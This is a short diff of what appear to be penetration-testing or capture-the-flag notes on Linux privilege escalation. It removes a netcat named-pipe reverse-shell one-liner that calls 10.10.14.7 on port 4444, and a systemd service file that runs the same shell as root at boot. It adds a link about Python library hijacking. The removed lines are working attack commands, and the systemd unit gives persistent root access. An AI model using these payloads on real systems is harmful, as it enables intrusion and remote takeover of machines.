@@ -454,25 +454,10 @@ python3.5 -c 'import sys; print( "\n".join(sys.path))'
 ```
 
 
-from datetime import datetime
-import sys
-import os
-from os import listdir
-import re
 
 
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.7 4444 >/tmp/f
-
-
-```
-[Unit]
-Description=roooooooooot
-
-[Service]
-Type=simple
-User=root
-ExecStart=/bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.7 4444 >/tmp/f'
-
-[Install]
-WantedBy=multi-user.target
-```
+	
+	
+	
+	https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8
+	python library hijacking in linux
